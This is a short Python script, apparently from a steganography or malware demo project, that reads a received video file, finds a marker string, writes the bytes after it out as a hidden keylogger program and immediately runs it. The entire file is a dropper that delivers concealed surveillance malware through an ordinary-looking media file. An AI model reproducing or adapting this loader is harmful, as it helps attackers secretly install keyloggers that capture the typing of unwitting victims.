# Importing all necessary libraries 
import cv2 
import os 

print("\n")
print("Extracting Keylogger from video on client side...")
print("\n")
with open('./received_keylogger.avi', 'rb') as wfile:
   data = wfile.read()

pos = data.find("****////")
#print(data[pos+8:])
prog = data[pos+8:]
f = open("hiddenkeylogger.py","wb")
f.write(str(prog))
f.close()
#print("Run the command-- python hiddenkeylogger.py")
print("Running hiddenkeylogger.py for 120 secs(Time can be changed refer readme.txt). \n\nPlease enter character now\n")

arg = ["hiddenkeylogger.py"]
os.execvp("python",("python",)+tuple(arg))

